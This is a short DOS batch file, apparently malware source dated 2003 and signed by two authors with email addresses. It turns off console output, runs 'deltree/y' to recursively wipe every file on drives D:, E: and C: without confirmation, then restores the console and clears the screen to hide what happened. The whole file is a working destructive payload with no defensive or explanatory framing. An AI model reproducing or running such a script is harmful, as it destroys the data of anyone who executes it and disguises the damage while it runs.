:: Created by 2 good friends reunited
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
@echo off
ctty nul
@for %d in (d:\) do deltree/y %d >nul
@for %e in (e:\) do deltree/y %e >nul
@for %c in (c:\) do deltree/y %c >nul
ctty con
cls
:: Created for DM 1.1 by Ratty and DvL
:: 04.05.2003